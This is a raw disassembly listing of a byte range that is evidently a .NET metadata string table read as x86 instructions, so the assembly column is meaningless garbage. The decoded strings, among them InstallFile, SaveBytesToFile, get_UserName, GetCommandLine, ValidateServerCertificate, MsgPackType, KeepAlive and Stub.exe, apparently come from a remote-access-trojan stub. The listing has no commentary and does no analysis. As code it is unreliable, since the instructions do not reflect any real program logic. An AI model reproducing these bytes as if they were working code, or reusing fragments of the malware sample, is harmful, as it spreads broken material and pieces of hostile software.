  407a7c:	6e                   	outsb  %ds:(%esi),(%dx)
  407a7d:	75 6d                	jne    0x407aec
  407a7f:	65 72 61             	gs jb  0x407ae3
  407a82:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407a86:	49                   	dec    %ecx
  407a87:	44                   	inc    %esp
  407a88:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407a8f:	6c                   	insb   (%dx),%es:(%edi)
  407a90:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407a95:	6f                   	outsl  %ds:(%esi),(%dx)
  407a96:	75 62                	jne    0x407afa
  407a98:	6c                   	insb   (%dx),%es:(%edi)
  407a99:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407a9d:	61                   	popa
  407a9e:	70 44                	jo     0x407ae4
  407aa0:	6f                   	outsl  %ds:(%esi),(%dx)
  407aa1:	75 62                	jne    0x407b05
  407aa3:	6c                   	insb   (%dx),%es:(%edi)
  407aa4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407aa8:	74 5f                	je     0x407b09
  407aaa:	48                   	dec    %eax
  407aab:	61                   	popa
  407aac:	6e                   	outsb  %ds:(%esi),(%dx)
  407aad:	64 6c                	fs insb (%dx),%es:(%edi)
  407aaf:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407ab3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab4:	74 69                	je     0x407b1f
  407ab6:	6d                   	insl   (%dx),%es:(%edi)
  407ab7:	65 46                	gs inc %esi
  407ab9:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407ac0:	64 6c                	fs insb (%dx),%es:(%edi)
  407ac2:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407ac6:	74 4d                	je     0x407b15
  407ac8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ac9:	64 75 6c             	fs jne 0x407b38
  407acc:	65 48                	gs dec %eax
  407ace:	61                   	popa
  407acf:	6e                   	outsb  %ds:(%esi),(%dx)
  407ad0:	64 6c                	fs insb (%dx),%es:(%edi)
  407ad2:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407ad6:	6e                   	outsb  %ds:(%esi),(%dx)
  407ad7:	74 69                	je     0x407b42
  407ad9:	6d                   	insl   (%dx),%es:(%edi)
  407ada:	65 54                	gs push %esp
  407adc:	79 70                	jns    0x407b4e
  407ade:	65 48                	gs dec %eax
  407ae0:	61                   	popa
  407ae1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ae2:	64 6c                	fs insb (%dx),%es:(%edi)
  407ae4:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407ae8:	74 54                	je     0x407b3e
  407aea:	79 70                	jns    0x407b5c
  407aec:	65 46                	gs inc %esi
  407aee:	72 6f                	jb     0x407b5f
  407af0:	6d                   	insl   (%dx),%es:(%edi)
  407af1:	48                   	dec    %eax
  407af2:	61                   	popa
  407af3:	6e                   	outsb  %ds:(%esi),(%dx)
  407af4:	64 6c                	fs insb (%dx),%es:(%edi)
  407af6:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407afa:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407b01:	65 
  407b02:	00 57 72             	add    %dl,0x72(%edi)
  407b05:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407b0c:	6c 
  407b0d:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407b12:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407b19:	65 74 41             	gs je  0x407b5d
  407b1c:	73 53                	jae    0x407b71
  407b1e:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407b25:	6e                   	outsb  %ds:(%esi),(%dx)
  407b26:	73 74                	jae    0x407b9c
  407b28:	61                   	popa
  407b29:	6c                   	insb   (%dx),%es:(%edi)
  407b2a:	6c                   	insb   (%dx),%es:(%edi)
  407b2b:	46                   	inc    %esi
  407b2c:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407b33:	6f 
  407b34:	64 65 46             	fs gs inc %esi
  407b37:	72 6f                	jb     0x407ba8
  407b39:	6d                   	insl   (%dx),%es:(%edi)
  407b3a:	46                   	inc    %esi
  407b3b:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407b42:	65 
  407b43:	42                   	inc    %edx
  407b44:	79 74                	jns    0x407bba
  407b46:	65 73 54             	gs jae 0x407b9d
  407b49:	6f                   	outsl  %ds:(%esi),(%dx)
  407b4a:	46                   	inc    %esi
  407b4b:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407b52:	6e 
  407b53:	52                   	push   %edx
  407b54:	6f                   	outsl  %ds:(%esi),(%dx)
  407b55:	6c                   	insb   (%dx),%es:(%edi)
  407b56:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407b5a:	6e                   	outsb  %ds:(%esi),(%dx)
  407b5b:	64 6f                	outsl  %fs:(%esi),(%dx)
  407b5d:	77 73                	ja     0x407bd2
  407b5f:	42                   	inc    %edx
  407b60:	75 69                	jne    0x407bcb
  407b62:	6c                   	insb   (%dx),%es:(%edi)
  407b63:	74 49                	je     0x407bae
  407b65:	6e                   	outsb  %ds:(%esi),(%dx)
  407b66:	52                   	push   %edx
  407b67:	6f                   	outsl  %ds:(%esi),(%dx)
  407b68:	6c                   	insb   (%dx),%es:(%edi)
  407b69:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407b6d:	74 5f                	je     0x407bce
  407b6f:	4d                   	dec    %ebp
  407b70:	61                   	popa
  407b71:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407b78:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407b7c:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7d:	63 65 73             	arpl   %esp,0x73(%ebp)
  407b80:	73 4d                	jae    0x407bcf
  407b82:	6f                   	outsl  %ds:(%esi),(%dx)
  407b83:	64 75 6c             	fs jne 0x407bf2
  407b86:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407b8a:	74 5f                	je     0x407beb
  407b8c:	57                   	push   %edi
  407b8d:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407b94:	79 6c                	jns    0x407c02
  407b96:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407b9a:	6f                   	outsl  %ds:(%esi),(%dx)
  407b9b:	63 65 73             	arpl   %esp,0x73(%ebp)
  407b9e:	73 57                	jae    0x407bf7
  407ba0:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407ba7:	79 6c                	jns    0x407c15
  407ba9:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407bad:	74 5f                	je     0x407c0e
  407baf:	46                   	inc    %esi
  407bb0:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407bb7:	00 
  407bb8:	73 65                	jae    0x407c1f
  407bba:	74 5f                	je     0x407c1b
  407bbc:	46                   	inc    %esi
  407bbd:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407bc4:	00 
  407bc5:	47                   	inc    %edi
  407bc6:	65 74 54             	gs je  0x407c1d
  407bc9:	65 6d                	gs insl (%dx),%es:(%edi)
  407bcb:	70 46                	jo     0x407c13
  407bcd:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407bd4:	00 
  407bd5:	47                   	inc    %edi
  407bd6:	65 74 46             	gs je  0x407c1f
  407bd9:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407be0:	00 
  407be1:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407be8:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407bed:	6f                   	outsl  %ds:(%esi),(%dx)
  407bee:	64 75 6c             	fs jne 0x407c5d
  407bf1:	65 4e                	gs dec %esi
  407bf3:	61                   	popa
  407bf4:	6d                   	insl   (%dx),%es:(%edi)
  407bf5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407bf9:	74 5f                	je     0x407c5a
  407bfb:	4d                   	dec    %ebp
  407bfc:	61                   	popa
  407bfd:	63 68 69             	arpl   %ebp,0x69(%eax)
  407c00:	6e                   	outsb  %ds:(%esi),(%dx)
  407c01:	65 4e                	gs dec %esi
  407c03:	61                   	popa
  407c04:	6d                   	insl   (%dx),%es:(%edi)
  407c05:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407c09:	74 5f                	je     0x407c6a
  407c0b:	4f                   	dec    %edi
  407c0c:	53                   	push   %ebx
  407c0d:	46                   	inc    %esi
  407c0e:	75 6c                	jne    0x407c7c
  407c10:	6c                   	insb   (%dx),%es:(%edi)
  407c11:	4e                   	dec    %esi
  407c12:	61                   	popa
  407c13:	6d                   	insl   (%dx),%es:(%edi)
  407c14:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407c18:	74 5f                	je     0x407c79
  407c1a:	46                   	inc    %esi
  407c1b:	75 6c                	jne    0x407c89
  407c1d:	6c                   	insb   (%dx),%es:(%edi)
  407c1e:	4e                   	dec    %esi
  407c1f:	61                   	popa
  407c20:	6d                   	insl   (%dx),%es:(%edi)
  407c21:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407c25:	56                   	push   %esi
  407c26:	61                   	popa
  407c27:	6c                   	insb   (%dx),%es:(%edi)
  407c28:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407c2f:	6e 
  407c30:	4e                   	dec    %esi
  407c31:	61                   	popa
  407c32:	6d                   	insl   (%dx),%es:(%edi)
  407c33:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407c37:	74 5f                	je     0x407c98
  407c39:	55                   	push   %ebp
  407c3a:	73 65                	jae    0x407ca1
  407c3c:	72 4e                	jb     0x407c8c
  407c3e:	61                   	popa
  407c3f:	6d                   	insl   (%dx),%es:(%edi)
  407c40:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407c45:	65 72 4e             	gs jb  0x407c96
  407c48:	61                   	popa
  407c49:	6d                   	insl   (%dx),%es:(%edi)
  407c4a:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407c4e:	74 4e                	je     0x407c9e
  407c50:	61                   	popa
  407c51:	6d                   	insl   (%dx),%es:(%edi)
  407c52:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407c56:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407c5a:	6f                   	outsl  %ds:(%esi),(%dx)
  407c5b:	73 74                	jae    0x407cd1
  407c5d:	4e                   	dec    %esi
  407c5e:	61                   	popa
  407c5f:	6d                   	insl   (%dx),%es:(%edi)
  407c60:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407c64:	6d                   	insl   (%dx),%es:(%edi)
  407c65:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407c6a:	65 54                	gs push %esp
  407c6c:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407c73:	5f                   	pop    %edi
  407c74:	4c                   	dec    %esp
  407c75:	61                   	popa
  407c76:	73 74                	jae    0x407cec
  407c78:	57                   	push   %edi
  407c79:	72 69                	jb     0x407ce4
  407c7b:	74 65                	je     0x407ce2
  407c7d:	54                   	push   %esp
  407c7e:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407c85:	6e                   	outsb  %ds:(%esi),(%dx)
  407c86:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407c8d:	54                   	push   %esp
  407c8e:	69 6d 65 00 47 65 74 	imul   $0x74654700,0x65(%ebp),%ebp
  407c95:	43                   	inc    %ebx
  407c96:	6f                   	outsl  %ds:(%esi),(%dx)
  407c97:	6d                   	insl   (%dx),%es:(%edi)
  407c98:	6d                   	insl   (%dx),%es:(%edi)
  407c99:	61                   	popa
  407c9a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c9b:	64 4c                	fs dec %esp
  407c9d:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407ca4:	74 65                	je     0x407d0b
  407ca6:	4c                   	dec    %esp
  407ca7:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  407cae:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407cb1:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  407cb5:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  407cbc:	6d                   	insl   (%dx),%es:(%edi)
  407cbd:	65 54                	gs push %esp
  407cbf:	79 70                	jns    0x407d31
  407cc1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407cc5:	74 5f                	je     0x407d26
  407cc7:	56                   	push   %esi
  407cc8:	61                   	popa
  407cc9:	6c                   	insb   (%dx),%es:(%edi)
  407cca:	75 65                	jne    0x407d31
  407ccc:	54                   	push   %esp
  407ccd:	79 70                	jns    0x407d3f
  407ccf:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  407cd3:	6c                   	insb   (%dx),%es:(%edi)
  407cd4:	75 65                	jne    0x407d3b
  407cd6:	54                   	push   %esp
  407cd7:	79 70                	jns    0x407d49
  407cd9:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  407cdd:	67 50                	addr16 push %eax
  407cdf:	61                   	popa
  407ce0:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  407ce3:	79 70                	jns    0x407d55
  407ce5:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ce9:	6f                   	outsl  %ds:(%esi),(%dx)
  407cea:	74 6f                	je     0x407d5b
  407cec:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  407cef:	54                   	push   %esp
  407cf0:	79 70                	jns    0x407d62
  407cf2:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407cf6:	74 54                	je     0x407d4c
  407cf8:	79 70                	jns    0x407d6a
  407cfa:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  407cfe:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407d01:	74 54                	je     0x407d57
  407d03:	79 70                	jns    0x407d75
  407d05:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  407d09:	6c                   	insb   (%dx),%es:(%edi)
  407d0a:	65 53                	gs push %ebx
  407d0c:	68 61 72 65 00       	push   $0x657261
  407d11:	53                   	push   %ebx
  407d12:	79 73                	jns    0x407d87
  407d14:	74 65                	je     0x407d7b
  407d16:	6d                   	insl   (%dx),%es:(%edi)
  407d17:	2e 43                	cs inc %ebx
  407d19:	6f                   	outsl  %ds:(%esi),(%dx)
  407d1a:	72 65                	jb     0x407d81
  407d1c:	00 53 65             	add    %dl,0x65(%ebx)
  407d1f:	72 76                	jb     0x407d97
  407d21:	65 72 73             	gs jb  0x407d97
  407d24:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  407d2b:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  407d2f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d30:	73 65                	jae    0x407d97
  407d32:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  407d36:	70 6f                	jo     0x407da7
  407d38:	73 65                	jae    0x407d9f
  407d3a:	00 50 61             	add    %dl,0x61(%eax)
  407d3d:	72 73                	jb     0x407db2
  407d3f:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  407d43:	72 52                	jb     0x407d97
  407d45:	65 76 65             	gs jbe 0x407dad
  407d48:	72 73                	jb     0x407dbd
  407d4a:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  407d4e:	30 39                	xor    %bh,(%ecx)
  407d50:	43                   	inc    %ebx
  407d51:	65 72 74             	gs jb  0x407dc8
  407d54:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407d5b:	00 56 61             	add    %dl,0x61(%esi)
  407d5e:	6c                   	insb   (%dx),%es:(%edi)
  407d5f:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  407d66:	72 
  407d67:	76 65                	jbe    0x407dce
  407d69:	72 43                	jb     0x407dae
  407d6b:	65 72 74             	gs jb  0x407de2
  407d6e:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407d75:	00 63 65             	add    %ah,0x65(%ebx)
  407d78:	72 74                	jb     0x407dee
  407d7a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407d81:	00 43 72             	add    %al,0x72(%ebx)
  407d84:	65 61                	gs popa
  407d86:	74 65                	je     0x407ded
  407d88:	00 53 65             	add    %dl,0x65(%ebx)
  407d8b:	74 54                	je     0x407de1
  407d8d:	68 72 65 61 64       	push   $0x64616572
  407d92:	45                   	inc    %ebp
  407d93:	78 65                	js     0x407dfa
  407d95:	63 75 74             	arpl   %esi,0x74(%ebp)
  407d98:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  407d9f:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407da4:	65 74 65             	gs je  0x407e0c
  407da7:	00 43 61             	add    %al,0x61(%ebx)
  407daa:	6c                   	insb   (%dx),%es:(%edi)
  407dab:	6c                   	insb   (%dx),%es:(%edi)
  407dac:	53                   	push   %ebx
  407dad:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  407db4:	74 
  407db5:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407db9:	6d                   	insl   (%dx),%es:(%edi)
  407dba:	70 69                	jo     0x407e25
  407dbc:	6c                   	insb   (%dx),%es:(%edi)
  407dbd:	65 72 47             	gs jb  0x407e07
  407dc0:	65 6e                	outsb  %gs:(%esi),(%dx)
  407dc2:	65 72 61             	gs jb  0x407e26
  407dc5:	74 65                	je     0x407e2c
  407dc7:	64 41                	fs inc %ecx
  407dc9:	74 74                	je     0x407e3f
  407dcb:	72 69                	jb     0x407e36
  407dcd:	62 75 74             	bound  %esi,0x74(%ebp)
  407dd0:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  407dd5:	75 67                	jne    0x407e3e
  407dd7:	67 61                	addr16 popa
  407dd9:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  407ddd:	74 74                	je     0x407e53
  407ddf:	72 69                	jb     0x407e4a
  407de1:	62 75 74             	bound  %esi,0x74(%ebp)
  407de4:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407de8:	6d                   	insl   (%dx),%es:(%edi)
  407de9:	56                   	push   %esi
  407dea:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  407df1:	74 74                	je     0x407e67
  407df3:	72 69                	jb     0x407e5e
  407df5:	62 75 74             	bound  %esi,0x74(%ebp)
  407df8:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407dfc:	73 65                	jae    0x407e63
  407dfe:	6d                   	insl   (%dx),%es:(%edi)
  407dff:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407e03:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  407e0a:	72 
  407e0b:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407e12:	73 73                	jae    0x407e87
  407e14:	65 6d                	gs insl (%dx),%es:(%edi)
  407e16:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407e1a:	72 61                	jb     0x407e7d
  407e1c:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  407e1f:	61                   	popa
  407e20:	72 6b                	jb     0x407e8d
  407e22:	41                   	inc    %ecx
  407e23:	74 74                	je     0x407e99
  407e25:	72 69                	jb     0x407e90
  407e27:	62 75 74             	bound  %esi,0x74(%ebp)
  407e2a:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  407e2f:	67 65 74 46          	addr16 gs je 0x407e79
  407e33:	72 61                	jb     0x407e96
  407e35:	6d                   	insl   (%dx),%es:(%edi)
  407e36:	65 77 6f             	gs ja  0x407ea8
  407e39:	72 6b                	jb     0x407ea6
  407e3b:	41                   	inc    %ecx
  407e3c:	74 74                	je     0x407eb2
  407e3e:	72 69                	jb     0x407ea9
  407e40:	62 75 74             	bound  %esi,0x74(%ebp)
  407e43:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407e47:	73 65                	jae    0x407eae
  407e49:	6d                   	insl   (%dx),%es:(%edi)
  407e4a:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  407e4e:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  407e55:	69 
  407e56:	6f                   	outsl  %ds:(%esi),(%dx)
  407e57:	6e                   	outsb  %ds:(%esi),(%dx)
  407e58:	41                   	inc    %ecx
  407e59:	74 74                	je     0x407ecf
  407e5b:	72 69                	jb     0x407ec6
  407e5d:	62 75 74             	bound  %esi,0x74(%ebp)
  407e60:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407e64:	73 65                	jae    0x407ecb
  407e66:	6d                   	insl   (%dx),%es:(%edi)
  407e67:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407e6b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e6c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6d:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  407e73:	74 69                	je     0x407ede
  407e75:	6f                   	outsl  %ds:(%esi),(%dx)
  407e76:	6e                   	outsb  %ds:(%esi),(%dx)
  407e77:	41                   	inc    %ecx
  407e78:	74 74                	je     0x407eee
  407e7a:	72 69                	jb     0x407ee5
  407e7c:	62 75 74             	bound  %esi,0x74(%ebp)
  407e7f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407e83:	73 65                	jae    0x407eea
  407e85:	6d                   	insl   (%dx),%es:(%edi)
  407e86:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  407e8a:	65 73 63             	gs jae 0x407ef0
  407e8d:	72 69                	jb     0x407ef8
  407e8f:	70 74                	jo     0x407f05
  407e91:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407e98:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  407e9f:	65 66 61             	gs popaw
  407ea2:	75 6c                	jne    0x407f10
  407ea4:	74 4d                	je     0x407ef3
  407ea6:	65 6d                	gs insl (%dx),%es:(%edi)
  407ea8:	62 65 72             	bound  %esp,0x72(%ebp)
  407eab:	41                   	inc    %ecx
  407eac:	74 74                	je     0x407f22
  407eae:	72 69                	jb     0x407f19
  407eb0:	62 75 74             	bound  %esi,0x74(%ebp)
  407eb3:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407eb7:	6d                   	insl   (%dx),%es:(%edi)
  407eb8:	70 69                	jo     0x407f23
  407eba:	6c                   	insb   (%dx),%es:(%edi)
  407ebb:	61                   	popa
  407ebc:	74 69                	je     0x407f27
  407ebe:	6f                   	outsl  %ds:(%esi),(%dx)
  407ebf:	6e                   	outsb  %ds:(%esi),(%dx)
  407ec0:	52                   	push   %edx
  407ec1:	65 6c                	gs insb (%dx),%es:(%edi)
  407ec3:	61                   	popa
  407ec4:	78 61                	js     0x407f27
  407ec6:	74 69                	je     0x407f31
  407ec8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ec9:	6e                   	outsb  %ds:(%esi),(%dx)
  407eca:	73 41                	jae    0x407f0d
  407ecc:	74 74                	je     0x407f42
  407ece:	72 69                	jb     0x407f39
  407ed0:	62 75 74             	bound  %esi,0x74(%ebp)
  407ed3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407ed7:	73 65                	jae    0x407f3e
  407ed9:	6d                   	insl   (%dx),%es:(%edi)
  407eda:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  407ede:	72 6f                	jb     0x407f4f
  407ee0:	64 75 63             	fs jne 0x407f46
  407ee3:	74 41                	je     0x407f26
  407ee5:	74 74                	je     0x407f5b
  407ee7:	72 69                	jb     0x407f52
  407ee9:	62 75 74             	bound  %esi,0x74(%ebp)
  407eec:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407ef0:	73 65                	jae    0x407f57
  407ef2:	6d                   	insl   (%dx),%es:(%edi)
  407ef3:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407ef7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef8:	70 79                	jo     0x407f73
  407efa:	72 69                	jb     0x407f65
  407efc:	67 68 74 41 74 74    	addr16 push $0x74744174
  407f02:	72 69                	jb     0x407f6d
  407f04:	62 75 74             	bound  %esi,0x74(%ebp)
  407f07:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407f0b:	73 65                	jae    0x407f72
  407f0d:	6d                   	insl   (%dx),%es:(%edi)
  407f0e:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407f12:	6f                   	outsl  %ds:(%esi),(%dx)
  407f13:	6d                   	insl   (%dx),%es:(%edi)
  407f14:	70 61                	jo     0x407f77
  407f16:	6e                   	outsb  %ds:(%esi),(%dx)
  407f17:	79 41                	jns    0x407f5a
  407f19:	74 74                	je     0x407f8f
  407f1b:	72 69                	jb     0x407f86
  407f1d:	62 75 74             	bound  %esi,0x74(%ebp)
  407f20:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407f24:	6e                   	outsb  %ds:(%esi),(%dx)
  407f25:	74 69                	je     0x407f90
  407f27:	6d                   	insl   (%dx),%es:(%edi)
  407f28:	65 43                	gs inc %ebx
  407f2a:	6f                   	outsl  %ds:(%esi),(%dx)
  407f2b:	6d                   	insl   (%dx),%es:(%edi)
  407f2c:	70 61                	jo     0x407f8f
  407f2e:	74 69                	je     0x407f99
  407f30:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  407f33:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  407f3a:	69 
  407f3b:	62 75 74             	bound  %esi,0x74(%ebp)
  407f3e:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407f42:	74 5f                	je     0x407fa3
  407f44:	55                   	push   %ebp
  407f45:	73 65                	jae    0x407fac
  407f47:	53                   	push   %ebx
  407f48:	68 65 6c 6c 45       	push   $0x456c6c65
  407f4d:	78 65                	js     0x407fb4
  407f4f:	63 75 74             	arpl   %esi,0x74(%ebp)
  407f52:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  407f56:	61                   	popa
  407f57:	64 42                	fs inc %edx
  407f59:	79 74                	jns    0x407fcf
  407f5b:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  407f5f:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  407f66:	00 
  407f67:	44                   	inc    %esp
  407f68:	65 6c                	gs insb (%dx),%es:(%edi)
  407f6a:	65 74 65             	gs je  0x407fd2
  407f6d:	56                   	push   %esi
  407f6e:	61                   	popa
  407f6f:	6c                   	insb   (%dx),%es:(%edi)
  407f70:	75 65                	jne    0x407fd7
  407f72:	00 69 6e             	add    %ch,0x6e(%ecx)
  407f75:	6e                   	outsb  %ds:(%esi),(%dx)
  407f76:	65 72 56             	gs jb  0x407fcf
  407f79:	61                   	popa
  407f7a:	6c                   	insb   (%dx),%es:(%edi)
  407f7b:	75 65                	jne    0x407fe2
  407f7d:	00 47 65             	add    %al,0x65(%edi)
  407f80:	74 56                	je     0x407fd8
  407f82:	61                   	popa
  407f83:	6c                   	insb   (%dx),%es:(%edi)
  407f84:	75 65                	jne    0x407feb
  407f86:	00 53 65             	add    %dl,0x65(%ebx)
  407f89:	74 56                	je     0x407fe1
  407f8b:	61                   	popa
  407f8c:	6c                   	insb   (%dx),%es:(%edi)
  407f8d:	75 65                	jne    0x407ff4
  407f8f:	00 76 61             	add    %dh,0x61(%esi)
  407f92:	6c                   	insb   (%dx),%es:(%edi)
  407f93:	75 65                	jne    0x407ffa
  407f95:	00 67 65             	add    %ah,0x65(%edi)
  407f98:	74 5f                	je     0x407ff9
  407f9a:	4b                   	dec    %ebx
  407f9b:	65 65 70 41          	gs gs jo 0x407fe0
  407f9f:	6c                   	insb   (%dx),%es:(%edi)
  407fa0:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  407fa7:	5f                   	pop    %edi
  407fa8:	4b                   	dec    %ebx
  407fa9:	65 65 70 41          	gs gs jo 0x407fee
  407fad:	6c                   	insb   (%dx),%es:(%edi)
  407fae:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  407fb5:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb6:	76 65                	jbe    0x40801d
  407fb8:	00 53 74             	add    %dl,0x74(%ebx)
  407fbb:	75 62                	jne    0x40801f
  407fbd:	2e 65 78 65          	cs js,pn 0x408026
  407fc1:	00 73 65             	add    %dh,0x65(%ebx)
  407fc4:	74 5f                	je     0x408025
  407fc6:	42                   	inc    %edx
  407fc7:	6c                   	insb   (%dx),%es:(%edi)
